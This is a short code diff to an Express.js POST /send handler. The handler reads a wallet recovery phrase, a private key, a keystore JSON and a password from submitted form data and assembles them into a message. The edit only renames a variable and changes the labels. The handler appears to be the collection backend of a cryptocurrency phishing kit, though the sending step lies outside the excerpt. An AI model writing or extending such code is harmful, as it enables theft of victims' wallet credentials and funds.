@@ -16,7 +16,7 @@ app.post("/send", async (req, res) => {
         phrase,
         private,
         key,
-        Pass
+        pass
     } = req.body;
 
     const message =
@@ -24,12 +24,12 @@ app.post("/send", async (req, res) => {
 
 Phrase: ${phrase}
 
-privateKey: ${private}
+private Key: ${private}
 
-keystoreJson: ${key}
+keystore Json: ${key}
 
 Password:
-${Pass}`;
+${pass}`;
 
     try {
 
